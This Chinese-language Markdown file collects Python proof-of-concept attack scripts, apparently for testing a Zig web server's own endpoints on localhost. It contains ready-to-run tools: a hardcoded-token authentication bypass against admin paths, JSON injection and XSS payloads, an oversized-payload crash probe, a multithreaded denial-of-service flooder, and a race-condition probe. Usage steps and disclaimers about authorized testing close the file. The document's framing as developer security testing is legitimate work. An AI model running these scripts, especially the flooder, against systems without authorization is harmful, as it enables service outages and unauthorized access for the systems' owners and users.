# 🔴 攻击概念验证脚本

> **警告**: 这些脚本仅用于安全测试和漏洞验证，请勿用于恶意攻击
> **用途**: 帮助开发团队理解和修复安全漏洞

## 🎯 高危漏洞利用脚本

### 1. 认证绕过攻击 (Critical)

```python
#!/usr/bin/env python3
"""
认证绕过攻击脚本
利用硬编码token绕过认证系统
"""
import requests
import sys

def auth_bypass_attack(target_url):
    """利用硬编码token进行认证绕过"""

    # 硬编码token (从源码中发现)
    hardcoded_token = "valid-token"

    headers = {
        "Authorization": f"Bearer {hardcoded_token}",
        "User-Agent": "SecurityTest/1.0"
    }

    print(f"🔴 [ATTACK] 尝试认证绕过攻击: {target_url}")

    # 测试受保护的端点
    protected_endpoints = [
        "/admin",
        "/api/admin",
        "/users/sensitive",
        "/config",
        "/system"
    ]

    for endpoint in protected_endpoints:
        try:
            url = f"{target_url}{endpoint}"
            response = requests.get(url, headers=headers, timeout=5)

            if response.status_code == 200:
                print(f"✅ [SUCCESS] 成功绕过认证: {endpoint}")
                print(f"    响应: {response.text[:100]}...")
            elif response.status_code == 401:
                print(f"❌ [FAILED] 认证失败: {endpoint}")
            else:
                print(f"⚠️  [INFO] 未知响应 {response.status_code}: {endpoint}")

        except Exception as e:
            print(f"❌ [ERROR] 请求失败 {endpoint}: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("用法: python auth_bypass.py <target_url>")
        print("示例: python auth_bypass.py http://localhost:8080")
        sys.exit(1)

    target = sys.argv[1]
    auth_bypass_attack(target)
```

### 2. JSON注入攻击 (Critical)

```python
#!/usr/bin/env python3
"""
JSON注入攻击脚本
利用echo端点的JSON格式化漏洞进行注入
"""
import requests
import json
import sys

def json_injection_attack(target_url):
    """JSON注入攻击"""

    echo_url = f"{target_url}/api/echo"

    print(f"🔴 [ATTACK] JSON注入攻击: {echo_url}")

    # 各种JSON注入载荷
    payloads = [
        # 基本JSON结构破坏
        '","admin":true,"hacked":"yes',

        # 权限提升载荷
        '","role":"admin","permissions":["all"],"user_id":0,"',

        # XSS载荷
        '<script>alert("XSS")</script>',

        # 数据泄露载荷
        '","sensitive_data":"exposed","password":"leaked","',

        # 复杂嵌套注入
        '","user":{"id":1,"role":"admin","token":"hijacked"},"system":"compromised",'
    ]

    for i, payload in enumerate(payloads, 1):
        try:
            print(f"\n📝 [TEST {i}] 测试载荷: {payload[:50]}...")

            response = requests.post(
                echo_url,
                data=payload,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=5
            )

            print(f"    状态码: {response.status_code}")
            print(f"    响应: {response.text}")

            # 检查是否成功注入
            if '"admin":true' in response.text or '"role":"admin"' in response.text:
                print("🚨 [CRITICAL] JSON注入成功! 检测到权限提升!")

            if '<script>' in response.text:
                print("🚨 [CRITICAL] XSS注入成功! 检测到脚本注入!")

        except Exception as e:
            print(f"❌ [ERROR] 请求失败: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("用法: python json_injection.py <target_url>")
        sys.exit(1)

    target = sys.argv[1]
    json_injection_attack(target)
```

### 3. 缓冲区溢出攻击 (Critical)

```python
#!/usr/bin/env python3
"""
缓冲区溢出攻击脚本
尝试触发内存安全漏洞
"""
import requests
import sys
import time

def buffer_overflow_attack(target_url):
    """缓冲区溢出攻击"""

    echo_url = f"{target_url}/api/echo"

    print(f"🔴 [ATTACK] 缓冲区溢出攻击: {echo_url}")

    # 不同大小的载荷测试
    sizes = [
        1024,      # 1KB
        8192,      # 8KB
        65536,     # 64KB
        1048576,   # 1MB
        10485760,  # 10MB
    ]

    for size in sizes:
        try:
            print(f"\n📝 [TEST] 测试载荷大小: {size} bytes")

            # 创建大载荷
            payload = "A" * size

            start_time = time.time()
            response = requests.post(
                echo_url,
                data=payload,
                timeout=30
            )
            end_time = time.time()

            print(f"    状态码: {response.status_code}")
            print(f"    响应时间: {end_time - start_time:.2f}s")
            print(f"    响应大小: {len(response.text)} bytes")

            # 检查是否触发异常行为
            if response.status_code == 500:
                print("🚨 [WARNING] 服务器内部错误! 可能触发了缓冲区问题!")

            if end_time - start_time > 10:
                print("🚨 [WARNING] 响应时间异常! 可能导致了性能问题!")

        except requests.exceptions.Timeout:
            print("🚨 [CRITICAL] 请求超时! 可能导致了服务器崩溃!")
        except requests.exceptions.ConnectionError:
            print("🚨 [CRITICAL] 连接错误! 服务器可能已崩溃!")
        except Exception as e:
            print(f"❌ [ERROR] 请求失败: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("用法: python buffer_overflow.py <target_url>")
        sys.exit(1)

    target = sys.argv[1]
    buffer_overflow_attack(target)
```

### 4. 拒绝服务攻击 (High)

```python
#!/usr/bin/env python3
"""
拒绝服务攻击脚本
通过大量请求和大载荷消耗服务器资源
"""
import requests
import threading
import time
import sys

class DoSAttack:
    def __init__(self, target_url, threads=50, requests_per_thread=100):
        self.target_url = target_url
        self.threads = threads
        self.requests_per_thread = requests_per_thread
        self.success_count = 0
        self.error_count = 0
        self.lock = threading.Lock()

    def attack_worker(self):
        """单个攻击线程"""
        for i in range(self.requests_per_thread):
            try:
                # 发送大载荷请求
                payload = "X" * 10000  # 10KB载荷
                response = requests.post(
                    f"{self.target_url}/api/echo",
                    data=payload,
                    timeout=5
                )

                with self.lock:
                    if response.status_code == 200:
                        self.success_count += 1
                    else:
                        self.error_count += 1

            except Exception:
                with self.lock:
                    self.error_count += 1

    def launch_attack(self):
        """启动DoS攻击"""
        print(f"🔴 [ATTACK] 启动DoS攻击")
        print(f"    目标: {self.target_url}")
        print(f"    线程数: {self.threads}")
        print(f"    每线程请求数: {self.requests_per_thread}")
        print(f"    总请求数: {self.threads * self.requests_per_thread}")

        start_time = time.time()

        # 启动攻击线程
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.attack_worker)
            t.start()
            threads.append(t)

        # 等待所有线程完成
        for t in threads:
            t.join()

        end_time = time.time()
        duration = end_time - start_time

        print(f"\n📊 [RESULTS] 攻击结果:")
        print(f"    持续时间: {duration:.2f}s")
        print(f"    成功请求: {self.success_count}")
        print(f"    失败请求: {self.error_count}")
        print(f"    请求速率: {(self.success_count + self.error_count) / duration:.2f} req/s")

        if self.error_count > self.success_count:
            print("🚨 [SUCCESS] DoS攻击可能成功! 大量请求失败!")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("用法: python dos_attack.py <target_url>")
        sys.exit(1)

    target = sys.argv[1]
    attacker = DoSAttack(target)
    attacker.launch_attack()
```

### 5. 竞态条件攻击 (High)

```python
#!/usr/bin/env python3
"""
竞态条件攻击脚本
利用并发访问触发竞态条件
"""
import requests
import threading
import time
import sys

def race_condition_attack(target_url):
    """竞态条件攻击"""

    print(f"🔴 [ATTACK] 竞态条件攻击: {target_url}")

    results = []
    lock = threading.Lock()

    def concurrent_request():
        """并发请求函数"""
        try:
            response = requests.get(f"{target_url}/api/status", timeout=5)
            with lock:
                results.append({
                    'status': response.status_code,
                    'time': time.time(),
                    'thread': threading.current_thread().ident
                })
        except Exception as e:
            with lock:
                results.append({
                    'error': str(e),
                    'time': time.time(),
                    'thread': threading.current_thread().ident
                })

    # 启动大量并发线程
    threads = []
    thread_count = 100

    print(f"📝 [TEST] 启动 {thread_count} 个并发线程...")

    start_time = time.time()

    for _ in range(thread_count):
        t = threading.Thread(target=concurrent_request)
        t.start()
        threads.append(t)

    # 等待所有线程完成
    for t in threads:
        t.join()

    end_time = time.time()

    # 分析结果
    success_count = len([r for r in results if 'status' in r and r['status'] == 200])
    error_count = len([r for r in results if 'error' in r])

    print(f"\n📊 [RESULTS] 竞态条件测试结果:")
    print(f"    总请求数: {len(results)}")
    print(f"    成功请求: {success_count}")
    print(f"    失败请求: {error_count}")
    print(f"    持续时间: {end_time - start_time:.2f}s")

    if error_count > 0:
        print("🚨 [WARNING] 检测到并发错误! 可能存在竞态条件!")

        # 显示错误详情
        errors = [r for r in results if 'error' in r]
        for error in errors[:5]:  # 只显示前5个错误
            print(f"    错误: {error['error']}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("用法: python race_condition.py <target_url>")
        sys.exit(1)

    target = sys.argv[1]
    race_condition_attack(target)
```

## 🛠️ 综合攻击脚本

```python
#!/usr/bin/env python3
"""
综合安全测试脚本
自动化执行多种攻击测试
"""
import requests
import sys
import time

def comprehensive_security_test(target_url):
    """综合安全测试"""

    print("🔴 [SECURITY TEST] 开始综合安全评估")
    print(f"目标: {target_url}")
    print("=" * 60)

    # 1. 基础连通性测试
    print("\n1️⃣ [TEST] 基础连通性测试")
    try:
        response = requests.get(target_url, timeout=5)
        print(f"✅ 服务器响应: {response.status_code}")
        print(f"   服务器信息: {response.headers.get('Server', 'Unknown')}")
    except Exception as e:
        print(f"❌ 连接失败: {e}")
        return

    # 2. 认证绕过测试
    print("\n2️⃣ [TEST] 认证绕过测试")
    auth_headers = {"Authorization": "Bearer valid-token"}
    try:
        response = requests.get(f"{target_url}/admin", headers=auth_headers, timeout=5)
        if response.status_code == 200:
            print("🚨 [CRITICAL] 认证绕过成功!")
        else:
            print(f"✅ 认证保护有效: {response.status_code}")
    except Exception as e:
        print(f"❌ 测试失败: {e}")

    # 3. JSON注入测试
    print("\n3️⃣ [TEST] JSON注入测试")
    injection_payload = '","admin":true,"hacked":"yes'
    try:
        response = requests.post(f"{target_url}/api/echo", data=injection_payload, timeout=5)
        if '"admin":true' in response.text:
            print("🚨 [CRITICAL] JSON注入成功!")
        else:
            print("✅ JSON注入防护有效")
    except Exception as e:
        print(f"❌ 测试失败: {e}")

    # 4. 大载荷测试
    print("\n4️⃣ [TEST] 大载荷测试")
    large_payload = "A" * 100000  # 100KB
    try:
        start_time = time.time()
        response = requests.post(f"{target_url}/api/echo", data=large_payload, timeout=10)
        end_time = time.time()

        if response.status_code == 500:
            print("🚨 [WARNING] 大载荷导致服务器错误!")
        elif end_time - start_time > 5:
            print("🚨 [WARNING] 大载荷导致响应延迟!")
        else:
            print("✅ 大载荷处理正常")
    except Exception as e:
        print(f"🚨 [CRITICAL] 大载荷导致异常: {e}")

    # 5. 信息泄露测试
    print("\n5️⃣ [TEST] 信息泄露测试")
    try:
        response = requests.get(f"{target_url}/api/status", timeout=5)
        if "version" in response.text.lower():
            print("⚠️ [INFO] 检测到版本信息泄露")
        if "error" in response.text.lower():
            print("⚠️ [INFO] 可能存在错误信息泄露")
        print("✅ 信息泄露测试完成")
    except Exception as e:
        print(f"❌ 测试失败: {e}")

    print("\n" + "=" * 60)
    print("🔴 [SECURITY TEST] 综合安全评估完成")
    print("⚠️  请查看上述结果，修复发现的安全问题")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("用法: python comprehensive_test.py <target_url>")
        print("示例: python comprehensive_test.py http://localhost:8080")
        sys.exit(1)

    target = sys.argv[1]
    comprehensive_security_test(target)
```

## 🚨 使用说明

### 安装依赖
```bash
pip install requests
```

### 运行测试
```bash
# 启动目标服务器
zig build run-libxev

# 在另一个终端运行攻击测试
python comprehensive_test.py http://localhost:8080
python auth_bypass.py http://localhost:8080
python json_injection.py http://localhost:8080
```

### 注意事项
- ⚠️ **仅用于安全测试**: 这些脚本仅用于测试自己的系统
- ⚠️ **获得授权**: 测试他人系统前必须获得明确授权
- ⚠️ **负责任披露**: 发现漏洞应负责任地报告给开发团队
- ⚠️ **法律合规**: 确保所有测试活动符合当地法律法规

---

*这些脚本帮助开发团队理解和修复安全漏洞，提高系统安全性*
